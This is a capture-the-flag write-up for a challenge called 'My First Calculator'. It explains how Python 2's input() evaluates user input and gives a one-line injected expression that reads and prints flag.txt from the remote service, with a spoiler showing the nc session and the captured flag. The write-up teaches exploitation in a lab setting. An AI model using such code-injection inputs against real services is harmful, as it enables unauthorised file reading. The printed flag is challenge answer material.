# My First Calculator

The flaw in the code is the use of `input("prompt")`, which prints a prompt and then **executes** the input passed in (in Python2).

The problem is that as an expression it must actually return a value, and if we want execution to continue, then it must be parsable as an int.

We would like to open a file, iterate through the lines, and print them.

In general, `print` doesn't return a value, and you'll get a syntax error if you try and use it. Also, you'll have to open the file and read through the lines, which is tricky but not impossible to do in a single line.

I've actually already discussed everything needed to solve this challenge.

## Solution

There's probably more than one way to crack this. But here's a one-liner that does everything you need:

```python
[input(line) for line in open("flag.txt","r")]
```

This won't allow execution to continue, because a list is not parsable as an int. However, it needn't since it can already print out every line from the file (as a **prompt** for more input).

<details><summary>Spoiler (Output Includes Flag)</summary>
<p>

```
$ nc misc.hsctf.com 7001
Welcome to my calculator!
You can add, subtract, multiply and divide some numbers

First number: [input(line) for line in open("flag.txt","r")]
flag{please_use_python3}
```

</p>
</details>

---

Andrew Steadman